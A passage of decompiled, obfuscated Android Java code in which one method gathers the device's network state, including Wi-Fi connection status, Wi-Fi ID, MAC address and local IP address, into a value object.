   public static NetStateVO z0() {
      NetStateVO var2 = new NetStateVO();
      if (Z() != null) {
         Context var3 = Z();
         ConnectivityManager var0 = (ConnectivityManager)var3.getSystemService("connectivity");
         if (var0 != null) {
            NetworkInfo var1 = var0.getActiveNetworkInfo();
            if (var1 != null) {
               Integer var4;
               if (var1.isConnected()) {
                  var4 = 1;
               } else {
                  var4 = 0;
               }

               var2.setIsConnected(var4);
               if (var1.getType() == 1) {
                  var2.setIsWifiConnected(1);
                  String var5 = h.l("wifiState");
                  WIFIState var6;
                  if (!q.B(var5)) {
                     var6 = (WIFIState)h.d(var5, WIFIState.class);
                  } else {
                     var6 = null;
                  }

                  WIFIState var7 = var6;
                  if (var6 == null) {
                     var7 = z(var3);
                  }

                  if (var7 != null) {
                     var2.setWifiId(var7.getWifiId());
                     var2.setMacAddress(var7.getMacAddress());
                     var2.setLocalIp(var7.getLocalIp());
                  }
               } else {
                  var2.setIsWifiConnected(0);
               }
            }
         }
      }

      return var2;
   }
}
